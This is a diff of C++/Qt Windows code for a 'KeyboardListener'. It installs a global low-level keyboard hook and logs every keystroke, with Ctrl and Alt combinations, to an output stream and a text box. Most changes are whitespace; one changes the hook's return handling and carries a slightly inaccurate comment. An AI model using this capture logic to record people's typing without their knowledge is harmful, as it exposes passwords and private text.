@@ -12,7 +12,7 @@ KeyboardListener::KeyboardListener()
 	}
 }
 
-LRESULT KeyboardListener::recordListener(int code, WPARAM wprm, LPARAM lprm) {
+LRESULT CALLBACK KeyboardListener::recordListener(int code, WPARAM wprm, LPARAM lprm) {
 	if(code == HC_ACTION) {
 		KBDLLHOOKSTRUCT *strct = (KBDLLHOOKSTRUCT *)lprm;
 		//qDebug() << strct->time << strct->vkCode << strct->scanCode << strct->flags << strct->dwExtraInfo;
@@ -22,49 +22,52 @@ LRESULT KeyboardListener::recordListener(int code, WPARAM wprm, LPARAM lprm) {
 			case WM_KEYUP:
 			case WM_SYSKEYUP:
 			{
-                Qt::KeyboardModifiers addedModifier = Qt::NoModifier;
+				Qt::KeyboardModifiers addedModifier = Qt::NoModifier;
 				switch(strct->vkCode) {
 					case VK_LSHIFT:
 					case VK_RSHIFT:
-                        addedModifier = Qt::ShiftModifier;
+						addedModifier = Qt::ShiftModifier;
 						break;
 					case VK_LCONTROL:
 					case VK_RCONTROL:
-                        addedModifier = Qt::ControlModifier;
+						addedModifier = Qt::ControlModifier;
 						break;
 					case VK_LMENU:
 					case VK_RMENU:
-                        addedModifier = Qt::AltModifier;
+						addedModifier = Qt::AltModifier;
 						break;
 				}
 				if(wprm == WM_KEYDOWN || wprm == WM_SYSKEYDOWN) {
-                    if(curModifiers != Qt::NoModifier && addedModifier == curModifiers)
+					if(curModifiers != Qt::NoModifier && addedModifier == curModifiers)
 						break;
-                    curModifiers |= addedModifier;
+					curModifiers |= addedModifier;
 					QChar actualChar = getCharForVKCode(strct->vkCode, curModifiers);
 					if(actualChar == '\n')
 						output.flush();
-                    if((curModifiers == Qt::ShiftModifier || curModifiers == Qt::NoModifier) && addedModifier == Qt::NoModifier) {
-                        if(up) up->insertPlainText(actualChar);
+					if((curModifiers == Qt::ShiftModifier || curModifiers == Qt::NoModifier) && addedModifier == Qt::NoModifier) {
+						if(up) up->insertPlainText(actualChar);
 						output.write(QString(actualChar).toLocal8Bit().data());
-                    }
-                    if(curModifiers == Qt::ControlModifier && addedModifier == Qt::NoModifier) {
-                        if(up) up->appendPlainText(QString("Ctrl+%1").arg(actualChar));
+					}
+					if(curModifiers == Qt::ControlModifier && addedModifier == Qt::NoModifier) {
+						if(up) up->appendPlainText(QString("Ctrl+%1").arg(actualChar));
 						output.write(QString("\nCtrl+%1").arg(actualChar).toUtf8());
-                    } else if(curModifiers == Qt::AltModifier && addedModifier == Qt::NoModifier) {
-                        if(up) up->appendPlainText(QString("Alt+%1").arg(actualChar));
+					} else if(curModifiers == Qt::AltModifier && addedModifier == Qt::NoModifier) {
+						if(up) up->appendPlainText(QString("Alt+%1").arg(actualChar));
 						output.write(QString("\nAlt+%1").arg(actualChar).toUtf8());
-                    }
+					}
 
-                    if(up) up->verticalScrollBar()->setValue(up->verticalScrollBar()->maximum());
+					if(up) up->verticalScrollBar()->setValue(up->verticalScrollBar()->maximum());
 				} else if(wprm == WM_KEYUP || wprm == WM_SYSKEYUP) {
-                    curModifiers &= ~addedModifier;
+					curModifiers &= ~addedModifier;
 				}
 			}
 				break;
 		}
+		return 0;
+	} else {
+		//According to the WINAPI documentation if the error code is < 0, it's highly recommended to CallNextHook and return the value from such, without processing data,
+		return CallNextHookEx(NULL, code, wprm, lprm);
 	}
-	return CallNextHookEx(NULL, code, wprm, lprm);
 }
 
 void KeyboardListener::setTextAddress(QPlainTextEdit* up) {
@@ -205,9 +208,9 @@ char KeyboardListener::getCharForVKCode(uint code, Qt::KeyboardModifiers modifie
 			return ' ';
 		case VK_TAB:
 			return '	';
-        case VK_SHIFT:
-        case VK_CONTROL:
-            return code;
+		case VK_SHIFT:
+		case VK_CONTROL:
+			return code;
 
 		default:
 			qDebug() << "Unhandled vk code" << code;
